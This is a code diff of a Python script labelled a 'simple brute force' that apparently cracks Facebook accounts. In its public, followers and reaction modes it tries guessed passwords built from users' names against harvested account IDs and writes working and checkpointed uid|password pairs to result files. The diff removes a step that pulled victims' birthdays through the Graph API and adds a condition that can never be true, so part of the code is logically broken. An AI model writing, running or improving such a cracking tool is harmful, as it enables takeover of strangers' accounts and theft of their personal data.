@@ -1,11 +1,11 @@
 # -*- coding: utf-8
 #####################################################
-# Author    : Angga Kurniawan                     #
-# Facebook  : https://facebook.com/gaaaarzxd      #
-# GitHub    : https://github.com/anggaxd          #
-# Instagram : https://www.instagram.com/gaaarzxd  #
-# Website   : https://anggaxd.herokuapp.com       #
-# File Name : run.py < simpel brute force >       #
+# * Author    : Angga Kurniawan                     #
+# * Facebook  : https://facebook.com/gaaaarzxd      #
+# * GitHub    : https://github.com/anggaxd          #
+# * Instagram : https://www.instagram.com/gaaarzxd  #
+# * Website   : https://anggaxd.herokuapp.com       #
+# * File Name : run.py < simpel brute force >       #
 #####################################################
 
 try:
@@ -203,7 +203,13 @@ def public():
 			if len(ss)<3:
 				continue
 			else:
-				pwx = [ ss+"123", ss+"1234", ss+"12345", "sayang" , "anjing", "bangsat", "katasandi" ]
+				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
+					pwx.append(ss+"123")
+					pwx.append(ss+"1234")
+					pwx.append(ss+"12345")
+				else:
+					pwx.append(ss+"123")
+					pwx.append(ss+"12345")
 		try:
 			for pw in pwx:
 				pw = pw.lower()
@@ -218,19 +224,6 @@ def public():
 					break
 					continue
 				if "checkpoint" in xo:
-					try:
-						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
-						data = ses.get(url).json()
-						ttl = data["birthday"].replace("/","-")
-						print("\r  \033[0;93m* --> " +uid+ "|" + pw + "|" + ttl)
-						cp.append(uid+"|"+pw+"|"+ttl)
-						save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
-						save.write("  * --> "+str(uid)+"|"+str(pw)+"|"+ttl+"\n")
-						save.close()
-						break
-					except(KeyError, IOError):
-						ttl = (" ") 
-					except:pass
 					print("\r  \033[0;93m* --> " +uid+ "|" + pw + "       ")
 					cp.append(uid+"|"+pw)
 					save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
@@ -276,6 +269,7 @@ def followers():
 	
 	def main(user):
 		global loop, token
+		pwx = []
 		sys.stdout.write(
 		      "\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s " % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
@@ -286,7 +280,13 @@ def followers():
 			if len(ss)<3:
 				continue
 			else:
-				pwx = [ ss+"123", ss+"1234", ss+"12345", "sayang" , "anjing" , "katasandi" ]
+				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
+					pwx.append(ss+"123")
+					pwx.append(ss+"1234")
+					pwx.append(ss+"12345")
+				else:
+					pwx.append(ss+"123")
+					pwx.append(ss+"12345")
 		try:
 			for pw in pwx:
 				pw = pw.lower()
@@ -301,19 +301,6 @@ def followers():
 					break
 					continue
 				if "checkpoint" in xo:
-					try:
-						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
-						data = ses.get(url).json()
-						ttl = data["birthday"].replace("/","-")
-						print("\r  \033[0;93m* --> " +uid+ "|" + pw + "|" + ttl)
-						cp.append(uid+"|"+pw+"|"+ttl)
-						save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
-						save.write("  * --> "+str(uid)+"|"+str(pw)+"|"+ttl+"\n")
-						save.close()
-						break
-					except(KeyError, IOError):
-						ttl = (" ") 
-					except:pass
 					print("\r  \033[0;93m* --> " +uid+ "|" + pw + "       ")
 					cp.append(uid+"|"+pw)
 					save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
@@ -359,6 +346,7 @@ def reaction():
 	
 	def main(user):
 		global loop, token
+		pwx = []
 		sys.stdout.write(
 		      "\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s " % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
@@ -369,7 +357,13 @@ def reaction():
 			if len(ss)<3:
 				continue
 			else:
-				pwx = [ ss+"123", ss+"1234", ss+"12345", "sayang" , "anjing" , "katasandi" ]
+				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
+					pwx.append(ss+"123")
+					pwx.append(ss+"1234")
+					pwx.append(ss+"12345")
+				else:
+					pwx.append(ss+"123")
+					pwx.append(ss+"12345")
 		try:
 			for pw in pwx:
 				pw = pw.lower()
@@ -384,19 +378,6 @@ def reaction():
 					break
 					continue
 				if "checkpoint" in xo:
-					try:
-						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
-						data = ses.get(url).json()
-						ttl = data["birthday"].replace("/","-")
-						print("\r  \033[0;93m* --> " +uid+ "|" + pw + "|" + ttl)
-						cp.append(uid+"|"+pw+"|"+ttl)
-						save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
-						save.write("  * --> "+str(uid)+"|"+str(pw)+"|"+ttl+"\n")
-						save.close()
-						break
-					except(KeyError, IOError):
-						ttl = (" ") 
-					except:pass
 					print("\r  \033[0;93m* --> " +uid+ "|" + pw + "       ")
 					cp.append(uid+"|"+pw)
 					save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
